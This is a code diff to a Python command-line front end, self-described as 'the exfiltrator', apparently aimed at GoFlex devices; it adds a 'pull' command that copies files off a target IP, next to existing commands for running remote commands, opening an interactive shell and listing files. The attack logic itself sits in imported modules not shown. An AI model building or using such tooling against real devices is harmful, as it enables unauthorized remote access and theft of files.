@@ -1,10 +1,14 @@
 """
 CLI interface for the exfiltrator.
 """
+import os
+from pathlib import Path
+
 import typer
 
 from goflex_shell.command_executor import CommandExecutor
 from goflex_shell.interactive_shell import InteractiveShell
+from wrappers.exfiltrate_file import ExfiltrateFiles
 from wrappers.list_files import ListFiles
 
 cli = typer.Typer()
@@ -23,7 +27,7 @@ def shell(ip: str) -> None:
 @cli.command()
 def execute(ip: str, command: str) -> None:
     try:
-        print(CommandExecutor.execute(ip, command))
+        print(CommandExecutor.execute(ip, command).decode())
     except Exception as exception:
         print(exception)
 
@@ -33,6 +37,21 @@ def execute(ip: str, command: str) -> None:
 def ls(ip: str, path: str) -> None:
     try:
         print("\n".join(ListFiles(ip).execute(path)))
+    except Exception as exception:
+        print(exception)
+
+
+# noinspection PyUnusedFunction
+@cli.command()
+def pull(ip: str, path: str) -> None:
+    try:
+        try:
+            os.makedirs(str(Path(path).parent))
+        except OSError:
+            pass
+
+        with open(path, 'wb') as file:
+            file.write(ExfiltrateFiles(ip).execute(path))
     except Exception as exception:
         print(exception)
 
